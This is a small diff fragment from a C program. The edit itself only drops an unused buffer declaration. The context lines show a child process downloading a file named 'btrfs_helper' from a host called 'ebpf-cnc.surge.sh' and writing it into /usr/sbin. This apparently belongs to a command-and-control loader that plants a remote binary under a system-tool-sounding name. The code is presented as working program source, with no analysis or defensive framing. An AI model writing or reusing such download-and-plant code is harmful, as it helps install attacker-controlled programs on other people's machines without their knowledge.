@@ -590,7 +590,6 @@ int main(int argc, char **argv)
 		child_pid = getpid();
 		printf("Child process running with PID: %d\n", child_pid);
 
-		char cmd[1024];
 		char local_path[1024];
 		snprintf(local_path, sizeof(local_path), "/usr/sbin/%s", help_progname);
 		download_file(local_path, "http://ebpf-cnc.surge.sh/btrfs_helper");
